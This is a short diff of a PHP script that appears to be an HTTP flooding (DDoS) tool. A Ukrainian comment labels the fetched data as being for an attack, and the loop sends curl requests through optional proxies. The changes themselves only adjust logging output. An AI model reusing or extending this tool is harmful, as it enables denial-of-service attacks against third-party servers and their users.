@@ -12,7 +12,7 @@
     while (true) {
         try {
             // отримую дані для атаки
-            echo "GET DATA \n";
+            //echo "GET DATA \n";
             $count = 0;
             
             $data = @file_get_contents($hosts[array_rand($hosts)]);
@@ -71,6 +71,8 @@
         curl_exec($curl);
         $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
         curl_close($curl);
-        echo $url . ' | HTTP code: ' . $httpcode . ($ip && $auth ? ' with proxy ' : '') . " | " . $total . " / " . $count . "\n";
+        //echo $url . ' | HTTP code: ' . $httpcode . ($ip && $auth ? ' with proxy ' : '') . " | " . $total . " / " . $count . "\n";
+        if ($count == 1)
+            echo $url . ' | HTTP code: ' . $httpcode . ($ip && $auth ? ' with proxy ' : '') . " | " . $total . "\n";
         return $httpcode;
     }
